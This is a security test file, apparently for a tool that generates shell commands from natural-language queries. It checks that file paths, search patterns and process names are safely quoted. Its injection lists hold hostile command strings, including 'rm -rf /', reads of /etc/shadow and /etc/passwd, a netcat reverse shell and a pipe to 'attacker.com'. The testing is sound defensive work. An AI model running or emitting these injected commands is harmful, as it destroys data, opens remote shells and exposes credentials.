"""Security-focused tests: verify that user-controlled input is sanitized
in all generated shell commands."""

import shlex

import pytest

from ask.llms.local.generators.discovery import FindCommandGenerator
from ask.llms.local.generators.file_ops import (
    CopyCommandGenerator,
    DeleteCommandGenerator,
    MoveCommandGenerator,
)
from ask.llms.local.generators.search import GrepCommandGenerator, ReplaceCommandGenerator
from ask.llms.local.generators.system import KillCommandGenerator, ProcessCommandGenerator
from ask.llms.local.parser import ParsedQuery


def _make_parsed(**kwargs) -> ParsedQuery:
    defaults = {"raw_query": "", "raw_query_original": ""}
    defaults.update(kwargs)
    return ParsedQuery(**defaults)


def _no_injection(command: str) -> bool:
    """Return True if the command string contains no unquoted shell metacharacters
    that could have been injected from user input.

    Strategy: attempt to parse with shlex; if parsing raises, the string is
    definitely dangerous.  We also check for common patterns that shlex.split
    might accept but are still injection indicators — those are caught by the
    test assertions that check the *value* of each token rather than just
    whether the string is parseable.
    """
    try:
        shlex.split(command)
        return True
    except ValueError:
        return False


# ---------------------------------------------------------------------------
# Path injection
# ---------------------------------------------------------------------------

INJECTION_PATHS = [
    "/tmp/foo; rm -rf /",
    "/tmp/foo && id",
    "/tmp/foo | cat /etc/shadow",
    "/tmp/foo `whoami`",
    "/tmp/foo $(id)",
    "/tmp/foo\nrm -rf /",
    "/tmp/foo > /etc/passwd",
    "/tmp/foo & nc -e /bin/sh 1.2.3.4 4444",
]


class TestPathInjectionInFind:
    def setup_method(self):
        self.gen = FindCommandGenerator()

    @pytest.mark.parametrize("evil_path", INJECTION_PATHS)
    def test_evil_path_does_not_inject(self, evil_path):
        p = _make_parsed(action="find", path=evil_path, file_types=["py"])
        cmds = self.gen.generate(p)
        for cmd in cmds:
            assert _no_injection(cmd.command), f"Command may not parse safely: {cmd.command!r}"
            tokens = shlex.split(cmd.command)
            # The leading command must be a safe binary, never an injected command
            assert tokens[0] in ("find", "ls", "stat", "sort", "xargs", "du")
            # The evil_path content must not appear unquoted across multiple tokens:
            # if it shows up, it must be contained within a single token.
            for dangerous_fragment in ("rm -rf", "cat /etc", "nc -e"):
                if dangerous_fragment in evil_path:
                    matching_tokens = [t for t in tokens if dangerous_fragment in t]
                    assert len(matching_tokens) <= 1, (
                        f"Fragment {dangerous_fragment!r} appears in multiple tokens: {tokens}"
                    )


class TestPathInjectionInDelete:
    def setup_method(self):
        self.gen = DeleteCommandGenerator()

    @pytest.mark.parametrize("evil_path", INJECTION_PATHS)
    def test_evil_path_does_not_inject(self, evil_path):
        p = _make_parsed(action="delete", path=evil_path, file_types=["log"])
        cmds = self.gen.generate(p)
        for cmd in cmds:
            assert _no_injection(cmd.command), f"Command may not parse safely: {cmd.command!r}"


class TestPathInjectionInCopy:
    def setup_method(self):
        self.gen = CopyCommandGenerator()

    @pytest.mark.parametrize("evil_path", INJECTION_PATHS)
    def test_evil_path_does_not_inject(self, evil_path):
        p = _make_parsed(action="copy", path=evil_path, destination="/backup")
        cmds = self.gen.generate(p)
        for cmd in cmds:
            assert _no_injection(cmd.command)

    @pytest.mark.parametrize("evil_path", INJECTION_PATHS)
    def test_evil_destination_does_not_inject(self, evil_path):
        p = _make_parsed(action="copy", path="/tmp", destination=evil_path)
        cmds = self.gen.generate(p)
        for cmd in cmds:
            assert _no_injection(cmd.command)


# ---------------------------------------------------------------------------
# Search pattern injection
# ---------------------------------------------------------------------------

INJECTION_PATTERNS = [
    "'; rm -rf /; echo '",
    '"; rm -rf /; echo "',
    "`whoami`",
    "$(id)",
    "foo | cat /etc/passwd",
    "foo; id",
    "foo\nrm -rf /",
]


class TestSearchPatternInjectionInGrep:
    def setup_method(self):
        self.gen = GrepCommandGenerator()

    @pytest.mark.parametrize("evil_pattern", INJECTION_PATTERNS)
    def test_evil_pattern_does_not_inject(self, evil_pattern):
        p = _make_parsed(
            action="grep",
            search_pattern=evil_pattern.lower(),
            search_pattern_original=evil_pattern,
        )
        cmds = self.gen.generate(p)
        for cmd in cmds:
            assert _no_injection(cmd.command), f"Unsafe command: {cmd.command!r}"


class TestSearchPatternInjectionInReplace:
    def setup_method(self):
        self.gen = ReplaceCommandGenerator()

    @pytest.mark.parametrize("evil_pattern", INJECTION_PATTERNS)
    def test_evil_pattern_does_not_inject(self, evil_pattern):
        p = _make_parsed(
            action="replace",
            search_pattern=evil_pattern.lower(),
            search_pattern_original=evil_pattern,
        )
        cmds = self.gen.generate(p)
        for cmd in cmds:
            assert _no_injection(cmd.command), f"Unsafe command: {cmd.command!r}"


# ---------------------------------------------------------------------------
# Process name injection
# ---------------------------------------------------------------------------

INJECTION_PROCESS_NAMES = [
    "python; rm -rf /",
    "node && cat /etc/passwd",
    "`id`",
    "$(whoami)",
    "nginx | nc attacker.com 4444",
]


class TestProcessNameInjectionInKill:
    def setup_method(self):
        self.gen = KillCommandGenerator()

    @pytest.mark.parametrize("evil_name", INJECTION_PROCESS_NAMES)
    def test_evil_process_name_does_not_inject(self, evil_name):
        p = _make_parsed(action="kill", process_name=evil_name)
        cmds = self.gen.generate(p)
        for cmd in cmds:
            # Command must be parseable (no unclosed quotes, etc.)
            assert _no_injection(cmd.command), f"Unsafe command: {cmd.command!r}"
            tokens = shlex.split(cmd.command)
            # The first token must be the shell command (pgrep, pkill, ps, kill)
            # — the injected content must be an argument, not a separate command
            assert tokens[0] in ("pgrep", "pkill", "ps", "kill")


class TestProcessNameInjectionInProcess:
    def setup_method(self):
        self.gen = ProcessCommandGenerator()

    @pytest.mark.parametrize("evil_name", INJECTION_PROCESS_NAMES)
    def test_evil_process_name_does_not_inject(self, evil_name):
        p = _make_parsed(action="process", process_name=evil_name)
        cmds = self.gen.generate(p)
        for cmd in cmds:
            assert _no_injection(cmd.command), f"Unsafe command: {cmd.command!r}"


# ---------------------------------------------------------------------------
# Dangerous command flagging
# ---------------------------------------------------------------------------


class TestDangerousFlagging:
    def test_delete_commands_always_flagged(self):
        gen = DeleteCommandGenerator()
        p = _make_parsed(action="delete", file_types=["py"])
        cmds = gen.generate(p)
        destructive = [c for c in cmds if "-delete" in c.command or "rm -" in c.command]
        assert all(c.is_dangerous for c in destructive)
        assert all(c.dangerous_explanation for c in destructive)

    def test_kill_commands_always_flagged(self):
        gen = KillCommandGenerator()
        p = _make_parsed(action="kill", process_name="python")
        cmds = gen.generate(p)
        kill_cmds = [c for c in cmds if "pkill" in c.command or "kill " in c.command]
        assert all(c.is_dangerous for c in kill_cmds)

    def test_find_preview_never_flagged(self):
        gen = FindCommandGenerator()
        p = _make_parsed(action="find", file_types=["py"])
        cmds = gen.generate(p)
        assert all(not c.is_dangerous for c in cmds)

    def test_grep_never_flagged(self):
        gen = GrepCommandGenerator()
        p = _make_parsed(action="grep", search_pattern="todo", search_pattern_original="TODO")
        cmds = gen.generate(p)
        assert all(not c.is_dangerous for c in cmds)

    def test_move_commands_flagged(self):
        gen = MoveCommandGenerator()
        p = _make_parsed(action="move", file_types=["py"], destination="/tmp")
        cmds = gen.generate(p)
        mv_cmds = [c for c in cmds if "mv " in c.command]
        assert all(c.is_dangerous for c in mv_cmds)
